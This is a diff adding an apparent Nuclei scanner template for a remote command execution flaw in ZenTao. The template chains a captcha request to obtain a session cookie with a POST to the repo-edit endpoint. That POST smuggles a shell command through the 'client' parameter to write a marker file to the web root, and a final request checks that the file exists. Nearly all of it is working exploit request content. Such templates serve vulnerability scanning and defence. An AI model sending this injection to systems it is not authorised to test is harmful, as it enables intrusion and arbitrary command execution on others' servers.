@@ -1,0 +1,63 @@
+id: zentao-repo-edit-rce
+info:
+  name: zentao-repo-edit-rce
+  author: apple
+  severity: critical
+  description: 企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2 开源版 17.4以下的未知版本<=version<=18.0.beta1 旗舰版 3.4以下的未知版本<=version<=4.0.beta1 存在远程命令执行
+  reference:
+    - https://www.zhihu.com/tardis/zm/art/622050639?source_id=1003
+    - https://www.freebuf.com/vuls/364470.html
+  tags: tags
+variables:
+  name: '{{rand_base(5)}}'
+
+http:
+  - raw:
+      - |+
+        GET /misc-captcha-user HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |-
+        POST /repo-edit-207821 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Cookie: {{zentao_cookie}}; path=/; HttpOnly; lang=zh-cn; expires=Mon, 08-Apr-2024 10:10:12 GMT; Max-Age=2592000; path=/; device=desktop; expires=Mon, 08-Apr-2024 10:10:12 GMT; Max-Age=2592000; path=/; HttpOnly; theme=default; expires=Mon, 08-Apr-2024 10:10:12 GMT; Max-Age=2592000; path=/
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Site: same-origin
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Content-Length: 87
+
+        SCM=Subversion&client=echo+ceshivuln+%3E%2Fwww%2Fzentaopms%2Fwww%2F{{name}}.txt%3B&path=1
+      - |+
+        GET /{{name}}.txt HTTP/1.1
+        Cookie: {{zentao_cookie}}; path=/; HttpOnly; lang=zh-cn; expires=Mon, 08-Apr-2024 10:16:52 GMT; Max-Age=2592000; path=/; device=desktop; expires=Mon, 08-Apr-2024 10:16:52 GMT; Max-Age=2592000; path=/; HttpOnly; theme=default; expires=Mon, 08-Apr-2024 10:16:52 GMT; Max-Age=2592000; path=/; lang=zh-cn; expires=Mon, 08-Apr-2024 10:16:53 GMT; Max-Age=2592000; path=/; device=desktop; expires=Mon, 08-Apr-2024 10:16:53 GMT; Max-Age=2592000; path=/; HttpOnly; theme=default; expires=Mon, 08-Apr-2024 10:16:53 GMT; Max-Age=2592000; path=/
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Content-Length: 0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ceshivuln'
+    extractors:
+      - type: regex
+        name: zentao_cookie
+        internal: true
+        part: header_1
+        regex:
+          - 'zentaosid=([a-zA-Z0-9]+)'
